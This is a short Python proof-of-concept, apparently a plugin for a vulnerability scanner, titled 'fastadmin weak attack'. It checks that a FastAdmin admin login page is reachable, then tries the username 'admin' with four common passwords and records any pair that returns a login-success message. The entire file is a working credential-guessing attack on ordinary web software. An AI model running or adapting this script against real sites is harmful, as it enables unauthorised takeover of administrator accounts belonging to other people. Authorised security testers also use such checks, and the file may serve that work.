#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# fastadmin weak attack
import sys
import json
import warnings
import time
from lib.core.Request import request
from urllib.parse import urlparse
post_headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Cookie": "123456"
}
get_headers ={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
}
def fast_check_1(url,attach_path):
    url_path=url+'/admin/index/login.html'
    passwd=["123456","admin","admin123","admin123456"]
    for password in passwd:
        post_data={
            "username":"admin",
            "password":password
        }
        try:
            req=request.post(url=url_path,data=post_data,headers=post_headers,timeout=5, verify=False)
            if req.status_code==200 and "登录成功" in req.text:
                attach_path.append(url_path+"---账号：admin"+"密码："+password)
            else:
                pass
        except Exception as e:
            pass

def poc(url):
    #处理url
    if url[:4] != "http":
        url = "http://" + url
    o = urlparse(url)
    url = o.scheme + "://" + o.netloc

    #判断是否可以访问
    try:
        attack_url = url + '/admin/index/login.html'
        r = request.get(url=attack_url, headers=get_headers, timeout=4, verify=False)
        if r.status_code != 200:
            return []
    except:
        return []

    #检查
    attach_path=[]
    fast_check_1(url,attach_path)
    return attach_path
